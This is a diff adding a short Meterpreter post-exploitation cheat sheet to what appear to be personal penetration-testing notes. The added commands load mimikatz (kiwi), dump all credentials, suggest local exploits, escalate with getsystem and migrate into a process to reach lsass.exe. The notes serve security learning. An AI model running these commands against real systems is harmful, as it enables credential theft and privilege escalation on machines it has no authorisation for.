@@ -372,3 +372,14 @@ To find subdomains when pentesting,
 - use gobuster/feroxbuster
 
 - use black widow (this allows you get list of urls and forms you can run in sqlmap)
+
+-----------------------------
+load powershell		#load powershell module into meterpreter
+load kiwi		#load mimikatz into meterpreter
+creds_all		#command to dump all credentails after loading kiwi
+
+run post/multi/recon/local_exploit_suggester		#background the meterpreter session and run this for privilege escalation. It uses WinPEAS.
+
+getsystem		#use this to attempt to escalate privileges on victim machine through meterpreter. If it doesn't run then perhaps the priv extension isn't loaded. Run "use priv" to load it.
+
+migrate #PROCESS PID#	#use this to migrate into another process, perhaps the printer service so you can access processes such as lsass.exe
